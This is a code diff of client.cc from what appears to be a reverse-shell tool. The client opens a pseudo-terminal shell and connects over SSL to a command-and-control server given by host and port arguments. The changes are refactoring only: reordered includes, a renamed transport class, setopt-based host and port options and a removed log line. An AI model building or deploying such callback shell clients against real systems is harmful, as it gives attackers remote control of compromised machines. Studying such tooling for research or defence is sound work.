@@ -2,11 +2,6 @@
 // client.cc
 // author: jcramb@gmail.com
 
-#include <cstdlib>
-#include <csignal>
-#include <cstring>
-#include <cstdio>
-
 #include <sys/types.h>
 #include <sys/ioctl.h>
 #include <sys/wait.h>
@@ -16,6 +11,11 @@
 #include <ctype.h>
 #include <poll.h>
 #include <pwd.h>
+
+#include <cstdlib>
+#include <csignal>
+#include <cstring>
+#include <cstdio>
 
 #include "core.h"
 #include "ssl.h"
@@ -57,7 +57,7 @@ protected:
 
 int main(int argc, char **argv) {
     pty_shell shell;
-    ssl_stream ssl;
+    ssl_transport ssl;
     transport & tpt = ssl;
     int read_count = 0;
     int write_count = 0;
@@ -68,14 +68,13 @@ int main(int argc, char **argv) {
     
     // set host ip / port if required
     if (argc > 1) {
-        ssl_set_host(argv[1]);
+        ssl.setopt(SSL_OPT_HOST, argv[1]);
     }
     if (argc > 2) {
-        ssl_set_port(atoi(argv[2]));
+        ssl.setopt(SSL_OPT_PORT, argv[2]);
     }
 
     // connect via SSL to c2 server (blocking)
-    LOG("info: connecting to c2 server %s:%d\n", ssl_get_host(), ssl_get_port());
     if (tpt.init(TPT_CLIENT) < 0) {
         LOG("fatal: failed to establish transport connection\n");    
         exit(-1);
